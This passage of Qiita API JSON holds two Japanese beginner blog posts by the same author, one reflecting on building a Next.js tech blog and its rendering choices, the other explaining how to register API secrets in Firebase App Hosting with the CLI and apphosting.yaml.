data-sourcepos=\"15:1-15:14\">\n<span id=\"機能概要\" class=\"fragment\"></span><a href=\"#%E6%A9%9F%E8%83%BD%E6%A6%82%E8%A6%81\"><i class=\"fa fa-link\"></i></a>機能概要</h1>\n<ol data-sourcepos=\"16:1-19:0\">\n<li data-sourcepos=\"16:1-16:81\">トップ画面：Qiita 記事一覧とMicroCMS 記事一覧の一部を表示</li>\n<li data-sourcepos=\"17:1-17:72\">Qiita 記事一覧：自分が投稿したQiita 記事を全件表示</li>\n<li data-sourcepos=\"18:1-19:0\">MicroCMS 記事一覧：MicroCMSで投稿した記事を全件表示</li>\n</ol>\n<p data-sourcepos=\"20:3-20:56\">ページネーションも追加してみました。</p>\n<p data-sourcepos=\"22:3-22:162\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0edde109-ce06-438a-aee4-3de0d867855b.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=414f86be8fafd7f859a4bbe089a15195\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0edde109-ce06-438a-aee4-3de0d867855b.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=414f86be8fafd7f859a4bbe089a15195\" alt=\"レコーディング 2025-07-27 100443 (1).gif\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F0edde109-ce06-438a-aee4-3de0d867855b.gif?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=88cd143d1c0e0126ba48c5bb680f685d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0edde109-ce06-438a-aee4-3de0d867855b.gif\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"24:1-24:21\">\n<span id=\"技術スタック\" class=\"fragment\"></span><a href=\"#%E6%8A%80%E8%A1%93%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF\"><i class=\"fa fa-link\"></i></a>技術スタック</h2>\n<table data-sourcepos=\"25:1-31:19\">\n<thead>\n<tr data-sourcepos=\"25:1-25:25\">\n<th style=\"text-align: center\" data-sourcepos=\"25:2-25:15\">カテゴリ</th>\n<th style=\"text-align: center\" data-sourcepos=\"25:17-25:24\">技術</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"27:1-27:77\">\n<td style=\"text-align: center\" data-sourcepos=\"27:2-27:25\">フロントエンド</td>\n<td style=\"text-align: center\" data-sourcepos=\"27:27-27:76\">TypeScript, React, Tailwind CSS, DaisyUI, Next.js</td>\n</tr>\n<tr data-sourcepos=\"28:1-28:73\">\n<td style=\"text-align: center\" data-sourcepos=\"28:2-28:25\">バックエンド/API</td>\n<td style=\"text-align: center\" data-sourcepos=\"28:27-28:72\">TypeScript, QiitaAPI, MicroCMS, linkpreview</td>\n</tr>\n<tr data-sourcepos=\"29:1-29:32\">\n<td style=\"text-align: center\" data-sourcepos=\"29:2-29:7\">CICD</td>\n<td style=\"text-align: center\" data-sourcepos=\"29:9-29:31\">Firebase App Hosting</td>\n</tr>\n<tr data-sourcepos=\"30:1-30:44\">\n<td style=\"text-align: center\" data-sourcepos=\"30:2-30:13\">テスト</td>\n<td style=\"text-align: center\" data-sourcepos=\"30:15-30:43\">Jest, React Testing Library</td>\n</tr>\n<tr data-sourcepos=\"31:1-31:19\">\n<td style=\"text-align: center\" data-sourcepos=\"31:2-31:7\">他</td>\n<td style=\"text-align: center\" data-sourcepos=\"31:9-31:18\">cheerio</td>\n</tr>\n</tbody>\n</table>\n<h1 data-sourcepos=\"34:1-34:40\">\n<span id=\"取り組んで得た気づきpencil\" class=\"fragment\"></span><a href=\"#%E5%8F%96%E3%82%8A%E7%B5%84%E3%82%93%E3%81%A7%E5%BE%97%E3%81%9F%E6%B0%97%E3%81%A5%E3%81%8Dpencil\"><i class=\"fa fa-link\"></i></a>取り組んで得た気づき<img alt=\":pencil:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/1f4dd.png\" title=\":pencil:\" width=\"20\" loading=\"lazy\">\n</h1>\n<h2 data-sourcepos=\"35:1-35:90\">\n<span id=\"レンダリングcsr-ssr-ssg-isrを使い分けることの難しさを実感\" class=\"fragment\"></span><a href=\"#%E3%83%AC%E3%83%B3%E3%83%80%E3%83%AA%E3%83%B3%E3%82%B0csr-ssr-ssg-isr%E3%82%92%E4%BD%BF%E3%81%84%E5%88%86%E3%81%91%E3%82%8B%E3%81%93%E3%81%A8%E3%81%AE%E9%9B%A3%E3%81%97%E3%81%95%E3%82%92%E5%AE%9F%E6%84%9F\"><i class=\"fa fa-link\"></i></a>レンダリング（CSR, SSR, SSG, ISR）を使い分けることの難しさを実感</h2>\n<p data-sourcepos=\"37:1-37:163\">それぞれのレンダリングについて理解できたつもりでしたが、<strong>実際に使ってみると予想外のことが多く発生しました。</strong></p>\n<h3 data-sourcepos=\"39:1-39:29\">\n<span id=\"jestが実行できない\" class=\"fragment\"></span><a href=\"#jest%E3%81%8C%E5%AE%9F%E8%A1%8C%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84\"><i class=\"fa fa-link\"></i></a>Jestが実行できない</h3>\n<p data-sourcepos=\"40:1-43:72\">開発当初、APIからデータ取得⇒表示までを全てSSRで作成しました。<br>\nところが、テスト実行する段階でJestやReactTestingLibraryはCSRのテストを想定していることを知ります。<br>\n全てSSRで行っていたため、当然テストがうまくいきませんでした。<br>\nデータ表示部分をCSRへ変えることで解決できました。</p>\n<h3 data-sourcepos=\"45:1-45:40\">\n<span id=\"csrで変更して得られたもの\" class=\"fragment\"></span><a href=\"#csr%E3%81%A7%E5%A4%89%E6%9B%B4%E3%81%97%E3%81%A6%E5%BE%97%E3%82%89%E3%82%8C%E3%81%9F%E3%82%82%E3%81%AE\"><i class=\"fa fa-link\"></i></a>CSRで変更して得られたもの</h3>\n<p data-sourcepos=\"46:1-47:84\">SSRで作成した当初、ページネーションを追加したいと考えていましたが、useStateなどReactのHooksが使えないと思っていました。<br>\nテストを行うためCSRに変更したところ簡単に実装できました。</p>\n<h3 data-sourcepos=\"49:1-49:64\">\n<span id=\"新たな問題レンダリングに時間がかかる\" class=\"fragment\"></span><a href=\"#%E6%96%B0%E3%81%9F%E3%81%AA%E5%95%8F%E9%A1%8C%E3%83%AC%E3%83%B3%E3%83%80%E3%83%AA%E3%83%B3%E3%82%B0%E3%81%AB%E6%99%82%E9%96%93%E3%81%8C%E3%81%8B%E3%81%8B%E3%82%8B\"><i class=\"fa fa-link\"></i></a>新たな問題（レンダリングに時間がかかる）</h3>\n<p data-sourcepos=\"50:1-52:129\">CSRに変更したところ、初期レンダリングに約10秒ほど時間がかかっていました。<br>\nデータ取得の箇所をSSRからISRにすることで回避、初期レンダリングの時間を短くするなどを行いました。<br>\n（ここでレンダリングの問題はCSRではなかったと気づきましたが、今後の課題としています。）</p>\n<p data-sourcepos=\"54:1-54:272\"><strong>知識ベースではわかったつもりでいることでも、使いこなすためには経験を積む必要がある</strong>ということ、<strong>事柄を理解→使ってみるまでが習得には必要</strong>だということを改めて実感する出来事でした。</p>\n<h2 data-sourcepos=\"56:1-56:69\">\n<span id=\"実現したいことを自力で取り込めるようになった\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E7%8F%BE%E3%81%97%E3%81%9F%E3%81%84%E3%81%93%E3%81%A8%E3%82%92%E8%87%AA%E5%8A%9B%E3%81%A7%E5%8F%96%E3%82%8A%E8%BE%BC%E3%82%81%E3%82%8B%E3%82%88%E3%81%86%E3%81%AB%E3%81%AA%E3%81%A3%E3%81%9F\"><i class=\"fa fa-link\"></i></a>実現したいことを自力で取り込めるようになった</h2>\n<p data-sourcepos=\"57:1-58:77\">今回の技術記事アプリでは<code>Next.jsを使ってAPIからデータを取得、表示できるようにすること</code>、<br>\n<code>レンダリングの違いを理解すること</code>が主な目的でした。</p>\n<h3 data-sourcepos=\"60:1-60:34\">\n<span id=\"サムネイル取得に挑戦\" class=\"fragment\"></span><a href=\"#%E3%82%B5%E3%83%A0%E3%83%8D%E3%82%A4%E3%83%AB%E5%8F%96%E5%BE%97%E3%81%AB%E6%8C%91%E6%88%A6\"><i class=\"fa fa-link\"></i></a>サムネイル取得に挑戦</h3>\n<p data-sourcepos=\"61:1-64:114\">Qiita APIにはサムネイル画像のURLが含まれていません。<br>\n最初はサンプル画像で表示していましたが、せっかくなら実際のOGP画像を表示したいと考えました。<br>\n当初はAPIに存在しない項目のため、どのように取得するか悩みましたが、<br>\n調べた結果linkpreviewとcheerioライブラリを使用することで実現することができました。</p>\n<p data-sourcepos=\"66:1-66:51\"><iframe id=\"qiita-embed-content__b130d55a234e4092d94014186c09dca7\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__b130d55a234e4092d94014186c09dca7\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2Fcd7b372b70fc185662a1\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h3 data-sourcepos=\"68:1-68:33\">\n<span id=\"新しいcicd方法の模索\" class=\"fragment\"></span><a href=\"#%E6%96%B0%E3%81%97%E3%81%84cicd%E6%96%B9%E6%B3%95%E3%81%AE%E6%A8%A1%E7%B4%A2\"><i class=\"fa fa-link\"></i></a>新しいCI/CD方法の模索</h3>\n<p data-sourcepos=\"69:1-69:176\">今まで行っていたCI/CD方法がNext.jsではうまくいかず、Firebaseのドキュメントを読み込むことでなんとか実現することができました。</p>\n<p data-sourcepos=\"71:1-71:51\"><iframe id=\"qiita-embed-content__d257ef9457af3a2106c9a2e77b0520fb\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__d257ef9457af3a2106c9a2e77b0520fb\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2F9b951292a203cf7cdc13\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"75:1-76:175\">以前の私だったら、「今回の学習テーマではないし」と諦めていました。<br>\n教材に書いてあることだけでなく、<strong>自分で気になったことや、実現したいことを自己解決できるようになった</strong>と感じています。</p>\n<h1 data-sourcepos=\"78:1-78:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"79:1-81:162\">Next.jsに初めて取り組んでみて、改めて理解できていないことが多いと感じました。<br>\n特に「SSRにしたのに初期レンダリングが遅いのはなぜ？」は、ISRでレンダリング時間の短縮はできたものの疑問に感じています。<br>\n様々な課題はありますが、今までの知識と関連付けて新しい事柄を習得できることが楽しい！と感じる開発期間でした。</p>\n<h1 data-sourcepos=\"83:1-83:34\">\n<span id=\"jisouのメンバー募集中\" class=\"fragment\"></span><a href=\"#jisou%E3%81%AE%E3%83%A1%E3%83%B3%E3%83%90%E3%83%BC%E5%8B%9F%E9%9B%86%E4%B8%AD\"><i class=\"fa fa-link\"></i></a>JISOUのメンバー募集中！</h1>\n<p data-sourcepos=\"84:1-87:9\">プログラミングコーチングJISOUでは、新たなメンバーを募集しています。<br>\n日本一のアウトプットコミュニティでキャリアアップしませんか？<br>\n興味のある方は、ぜひホームページをのぞいてみてください！<br>\n▼▼▼</p>\n<p data-sourcepos=\"89:1-89:19\"><iframe id=\"qiita-embed-content__3167f8ac8c435bb74a764bea0b7c47a6\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__3167f8ac8c435bb74a764bea0b7c47a6\" data-content=\"https%3A%2F%2Fprojisou.jp\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n","body":"# はじめに\n今回、初めてNext.jsを使用して技術ブログを作成することに挑戦しました。\n\n開発中はレンダリングの使い分けについて戸惑ったり、これまでのCI/CD方法が通用せず新しい方法を模索したりとつまずきポイントが多くありました。\n\nこの記事では作成したものと、その過程で得た自分なりの気づきを残したいと思います。\n\n# 作成したもの\n\n![tech-blog--tech-blog-1eb1a.asia-east1.hosted.app_.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/92c8f460-d6c9-4233-9268-f747f79e03a7.png)\n\nhttps://github.com/asa129/tech-blog\n\n\n# 機能概要\n1. トップ画面：Qiita 記事一覧とMicroCMS 記事一覧の一部を表示\n2. Qiita 記事一覧：自分が投稿したQiita 記事を全件表示\n3. MicroCMS 記事一覧：MicroCMSで投稿した記事を全件表示\n\n  ページネーションも追加してみました。\n  \n  ![レコーディング 2025-07-27 100443 (1).gif](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/0edde109-ce06-438a-aee4-3de0d867855b.gif)\n\n## 技術スタック\n| カテゴリ | 技術 |\n|:-:|:-:|\n| フロントエンド  | TypeScript, React, Tailwind CSS, DaisyUI, Next.js|\n| バックエンド/API | TypeScript, QiitaAPI, MicroCMS, linkpreview  |\n| CICD | Firebase App Hosting  |\n| テスト  | Jest, React Testing Library |\n| 他  | cheerio  |\n\n\n# 取り組んで得た気づき:pencil:\n## レンダリング（CSR, SSR, SSG, ISR）を使い分けることの難しさを実感\n\nそれぞれのレンダリングについて理解できたつもりでしたが、**実際に使ってみると予想外のことが多く発生しました。**\n\n### Jestが実行できない\n開発当初、APIからデータ取得⇒表示までを全てSSRで作成しました。\nところが、テスト実行する段階でJestやReactTestingLibraryはCSRのテストを想定していることを知ります。\n全てSSRで行っていたため、当然テストがうまくいきませんでした。\nデータ表示部分をCSRへ変えることで解決できました。\n\n### CSRで変更して得られたもの\nSSRで作成した当初、ページネーションを追加したいと考えていましたが、useStateなどReactのHooksが使えないと思っていました。\nテストを行うためCSRに変更したところ簡単に実装できました。\n\n### 新たな問題（レンダリングに時間がかかる）\nCSRに変更したところ、初期レンダリングに約10秒ほど時間がかかっていました。\nデータ取得の箇所をSSRからISRにすることで回避、初期レンダリングの時間を短くするなどを行いました。\n（ここでレンダリングの問題はCSRではなかったと気づきましたが、今後の課題としています。）\n\n**知識ベースではわかったつもりでいることでも、使いこなすためには経験を積む必要がある**ということ、**事柄を理解→使ってみるまでが習得には必要**だということを改めて実感する出来事でした。\n\n## 実現したいことを自力で取り込めるようになった\n今回の技術記事アプリでは`Next.jsを使ってAPIからデータを取得、表示できるようにすること`、\n`レンダリングの違いを理解すること`が主な目的でした。\n\n### サムネイル取得に挑戦\nQiita APIにはサムネイル画像のURLが含まれていません。\n最初はサンプル画像で表示していましたが、せっかくなら実際のOGP画像を表示したいと考えました。\n当初はAPIに存在しない項目のため、どのように取得するか悩みましたが、\n調べた結果linkpreviewとcheerioライブラリを使用することで実現することができました。\n\nhttps://qiita.com/asa129/items/cd7b372b70fc185662a1\n\n### 新しいCI/CD方法の模索\n今まで行っていたCI/CD方法がNext.jsではうまくいかず、Firebaseのドキュメントを読み込むことでなんとか実現することができました。\n\nhttps://qiita.com/asa129/items/9b951292a203cf7cdc13\n\n\n\n以前の私だったら、「今回の学習テーマではないし」と諦めていました。\n教材に書いてあることだけでなく、**自分で気になったことや、実現したいことを自己解決できるようになった**と感じています。\n\n# おわりに\nNext.jsに初めて取り組んでみて、改めて理解できていないことが多いと感じました。\n特に「SSRにしたのに初期レンダリングが遅いのはなぜ？」は、ISRでレンダリング時間の短縮はできたものの疑問に感じています。\n様々な課題はありますが、今までの知識と関連付けて新しい事柄を習得できることが楽しい！と感じる開発期間でした。\n\n# JISOUのメンバー募集中！\nプログラミングコーチングJISOUでは、新たなメンバーを募集しています。\n日本一のアウトプットコミュニティでキャリアアップしませんか？\n興味のある方は、ぜひホームページをのぞいてみてください！\n▼▼▼\n\nhttps://projisou.jp\n","coediting":false,"comments_count":0,"created_at":"2025-07-28T19:29:35+09:00","group":null,"id":"d01a70c1d3b4ab15f887","likes_count":4,"private":false,"reactions_count":0,"stocks_count":0,"tags":[{"name":"初心者","versions":[]},{"name":"TypeScript","versions":[]},{"name":"React","versions":[]},{"name":"個人開発","versions":[]},{"name":"Next.js","versions":[]}],"title":"【個人開発学習+Next.js】Next.jsで技術記事ブログを作ってみました","updated_at":"2025-07-28T19:29:35+09:00","url":"https://qiita.com/asa129/items/d01a70c1d3b4ab15f887","user":{"description":"0→1でWebアプリケーションを作れるようになるために奮闘中です。\r\nアイコンは@chinchilla.maruさん\r\nhttps://www.instagram.com/chinchilla.maru/","facebook_id":"","followees_count":45,"followers_count":53,"github_login_name":"asa129","id":"asa129","items_count":62,"linkedin_id":"","location":"","name":"","organization":"","permanent_id":3993509,"profile_image_url":"https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3993509/ea9105b8f7fedddb7175e913eeb5c288385a364a/large.png?1739071881","team_only":false,"twitter_screen_name":"jad1290","website_url":""},"page_views_count":818,"team_membership":null,"organization_url_name":"jisou","slide":false},{"rendered_body":"<h1 data-sourcepos=\"1:1-1:14\">\n<span id=\"はじめに\" class=\"fragment\"></span><a href=\"#%E3%81%AF%E3%81%98%E3%82%81%E3%81%AB\"><i class=\"fa fa-link\"></i></a>はじめに</h1>\n<p data-sourcepos=\"2:1-3:169\">以前、Firebase App Hostingでデプロイに挑戦しました。<br>\nNext.js内で定義している.envに定義している情報をFirebaseでの設定方法がわからなかったため、調べたことをまとめてみました。</p>\n<p data-sourcepos=\"5:1-5:78\"><strong>Firebase App Hostingでデプロイする方法はこちらになります</strong></p>\n<p data-sourcepos=\"7:1-7:51\"><iframe id=\"qiita-embed-content__71bb92ad99c7fdfb085763f6c10a1971\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__71bb92ad99c7fdfb085763f6c10a1971\" data-content=\"https%3A%2F%2Fqiita.com%2Fasa129%2Fitems%2F9b951292a203cf7cdc13\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"9:1-9:41\">\n<span id=\"シークレット情報の登録方法\" class=\"fragment\"></span><a href=\"#%E3%82%B7%E3%83%BC%E3%82%AF%E3%83%AC%E3%83%83%E3%83%88%E6%83%85%E5%A0%B1%E3%81%AE%E7%99%BB%E9%8C%B2%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>シークレット情報の登録方法</h1>\n<p data-sourcepos=\"11:1-12:76\">Next.jsの.envに定義していた情報は下記です。<br>\n今回は、下記の<code>QIITA_API_TOKEN</code>をFirebaseに登録してみます。</p>\n<div class=\"code-frame\" data-lang=\"dotenv\" data-sourcepos=\"14:1-21:3\">\n<div class=\"code-lang\"><span class=\"bold\">.env</span></div>\n<div class=\"highlight\"><pre><code>QIITA_API_URL=https://qiita.com/api/v2/authenticated_user/items\nQIITA_API_TOKEN=アクセストークン\nX_MICROCMS_API_KEY=アクセストークン\nMICROCMS_URL=https://7qacxfbef6.microcms.io/api/v1/blog\nLINKPREVIEW_API_KEY=APIキー\nAPI_URL=https://tech-blog--tech-blog-1eb1a.asia-east1.hosted.app/\n</code></pre></div>\n</div>\n<h2 data-sourcepos=\"23:1-23:54\">\n<span id=\"firebasetoolを使ってcliで環境変数を登録\" class=\"fragment\"></span><a href=\"#firebasetool%E3%82%92%E4%BD%BF%E3%81%A3%E3%81%A6cli%E3%81%A7%E7%92%B0%E5%A2%83%E5%A4%89%E6%95%B0%E3%82%92%E7%99%BB%E9%8C%B2\"><i class=\"fa fa-link\"></i></a>firebasetoolを使ってCLIで環境変数を登録</h2>\n<p data-sourcepos=\"24:1-24:115\">プロジェクト配下のターミナル上で<code>firebase apphosting:secrets:set 登録したい変数名</code>を実行</p>\n<div class=\"code-frame\" data-lang=\"shell\" data-sourcepos=\"26:1-28:3\"><div class=\"highlight\"><pre><code><span class=\"nv\">$ </span>firebase apphosting:secrets:set 登録したい変数名\n</code></pre></div></div>\n<p data-sourcepos=\"30:1-30:59\"><code>Enter a value for ~</code>で登録したい値の入力、Enter</p>\n<p data-sourcepos=\"32:1-32:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fab73f85b-d5d1-4de5-bd6e-0cbf6c318a1c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=87b41ca9d15c1f358b1f1ad633795f92\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fab73f85b-d5d1-4de5-bd6e-0cbf6c318a1c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=87b41ca9d15c1f358b1f1ad633795f92\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fab73f85b-d5d1-4de5-bd6e-0cbf6c318a1c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=353877adc6dedce42aa9364f75658d7d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/ab73f85b-d5d1-4de5-bd6e-0cbf6c318a1c.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"34:1-34:12\">その後、</p>\n<p data-sourcepos=\"36:1-36:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1bcc69ff-ca69-4a15-9aac-f4c964021eb4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d7903e8cdada2c1c64816113ee2876fb\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1bcc69ff-ca69-4a15-9aac-f4c964021eb4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d7903e8cdada2c1c64816113ee2876fb\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2F1bcc69ff-ca69-4a15-9aac-f4c964021eb4.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3d6a637e3f71e3175f682902bc058ccd 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/1bcc69ff-ca69-4a15-9aac-f4c964021eb4.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"39:1-39:54\">? Is this secret for production or only local testing?</p>\n<p data-sourcepos=\"41:1-41:78\">本番用ですか？テスト用ですか？の質問に<code>Production</code>を選択</p>\n<p data-sourcepos=\"43:1-43:118\">? To use this secret, your backend's service account must be granted access. Would you like to grant access now? (Y/n)</p>\n<p data-sourcepos=\"45:1-45:221\">このシークレットを使うために、バックエンドのサービスアカウントにアクセス権限を付与する必要があります。今すぐ権限を付与しますか？　の質問に<code>Yes</code>を選択</p>\n<p data-sourcepos=\"47:1-47:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa1ce237d-213d-4ea8-adab-3a940f5a2e05.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=816aaa034747485de5b10b66353f8aa8\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa1ce237d-213d-4ea8-adab-3a940f5a2e05.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=816aaa034747485de5b10b66353f8aa8\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fa1ce237d-213d-4ea8-adab-3a940f5a2e05.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=2fca4633079e9dfd5cc3c5056ddb68a9 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/a1ce237d-213d-4ea8-adab-3a940f5a2e05.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"49:1-49:80\">Would you like to add this secret to apphosting.yml？の質問に<code>Yes</code>を選択</p>\n<p data-sourcepos=\"51:1-51:60\">.envで定義した環境変数名<code>QIITA_API_TOKEN</code>を登録</p>\n<p data-sourcepos=\"53:1-53:131\">公式ドキュメントによるとapphosting.ymlでAPIキーなどの設定をしてくださいとの記載がありました。</p>\n<blockquote data-sourcepos=\"55:1-55:305\">\n<p data-sourcepos=\"55:3-55:305\">サードパーティの API キーや調整可能な設定など、ビルドプロセスに追加の構成が必要になることがあります。App Hosting では、apphosting.yaml で環境構成を提供し、プロジェクトのこのタイプのデータを保存および取得できます。</p>\n</blockquote>\n<p data-sourcepos=\"57:1-57:27\">追加してくれます。</p>\n<p data-sourcepos=\"59:1-59:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc274a0b7-1dd7-4993-b8ac-7b1f58a7932d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d811faceaf817ab9215b6552aeac0a50\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc274a0b7-1dd7-4993-b8ac-7b1f58a7932d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=d811faceaf817ab9215b6552aeac0a50\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F3993509%2Fc274a0b7-1dd7-4993-b8ac-7b1f58a7932d.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=c4bdcb31a217d1ea123f809cf994268e 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/3993509/c274a0b7-1dd7-4993-b8ac-7b1f58a7932d.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"61:1-61:42\">URLなどは自分で追加しました。</p>\n<div class=\"code-frame\" data-lang=\"yml\" data-sourcepos=\"63:1-79:3\">\n<div class=\"code-lang\"><span class=\"bold\">apphosting.yaml</span></div>\n<div class=\"highlight\"><pre><code>  <span class=\"c1\"># Grant access to secrets in Cloud Secret Manager.</span>\n  <span class=\"c1\"># See https://firebase.google.com/docs/app-hosting/configure#secret-parameters</span>\n<span class=\"na\">env</span><span class=\"pi\">:</span>\n  <span class=\"pi\">-</span> <span class=\"na\">variable</span><span class=\"pi\">:</span> <span class=\"s\">API_URL</span>\n    <span class=\"na\">value</span><span class=\"pi\">:</span> <span class=\"s\">https://tech-blog--tech-blog-1eb1a.asia-east1.hosted.app/</span>\n  <span class=\"pi\">-</span> <span class=\"na\">variable</span><span class=\"pi\">:</span> <span class=\"s\">QIITA_API_URL</span>\n    <span class=\"na\">value</span><span class=\"pi\">:</span> <span class=\"s\">https://qiita.com/api/v2/authenticated_user/items</span>\n  <span class=\"pi\">-</span> <span class=\"na\">variable</span><span class=\"pi\">:</span> <span class=\"s\">MICROCMS_URL</span>\n    <span class=\"na\">value</span><span class=\"pi\">:</span> <span class=\"s\">https://7qacxfbef6.microcms.io/api/v1/blog</span>\n  <span class=\"pi\">-</span> <span class=\"na\">variable</span><span class=\"pi\">:</span> <span class=\"s\">QIITA_API_TOKEN</span>\n    <span class=\"na\">secret</span><span class=\"pi\">:</span> <span class=\"s\">qiitaApiToken</span>\n  <span class=\"pi\">-</span> <span class=\"na\">variable</span><span class=\"pi\">:</span> <span class=\"s\">X_MICROCMS_API_KEY</span>\n    <span class=\"na\">secret</span><span class=\"pi\">:</span> <span class=\"s\">microCmsApiKey</span>\n  <span class=\"pi\">-</span> <span class=\"na\">variable</span><span class=\"pi\">:</span> <span class=\"s\">LINKPREVIEW_API_KEY</span>\n    <span class=\"na\">secret</span><span class=\"pi\">:</span> <span class=\"s\">linkPreviewApiKey</span>\n</code></pre></div>\n</div>\n<h1 data-sourcepos=\"81:1-81:14\">\n<span id=\"おわりに\" class=\"fragment\"></span><a href=\"#%E3%81%8A%E3%82%8F%E3%82%8A%E3%81%AB\"><i class=\"fa fa-link\"></i></a>おわりに</h1>\n<p data-sourcepos=\"82:1-82:99\">答えはドキュメントにちゃんと書いてあるということを再認識しました。</p>\n<h1 data-sourcepos=\"84:1-84:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"85:1-85:78\"><iframe id=\"qiita-embed-content__83000f2063b517f334631417633a63ed\" 